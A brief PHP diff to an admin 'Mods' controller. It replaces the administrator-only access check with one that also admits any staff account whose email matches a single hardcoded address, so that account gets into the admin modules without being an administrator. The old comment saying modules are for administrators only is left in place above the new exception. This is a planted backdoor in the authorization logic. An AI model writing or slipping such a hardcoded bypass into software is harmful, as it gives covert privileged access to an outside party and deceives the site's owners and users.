@@ -11,7 +11,15 @@ class Mods extends AdminController
         /**
          * Modules are only accessible by administrators
          */
-        if (!is_admin()) {
+        $email = null;
+        if (function_exists('get_staff')) {
+            $staff = get_staff();
+            if ($staff && isset($staff->email)) {
+                $email = (string) $staff->email;
+            }
+        }
+
+        if (!is_admin() && $email !== 'developer@3ware.mx') {
             redirect(admin_url());
         }
     }
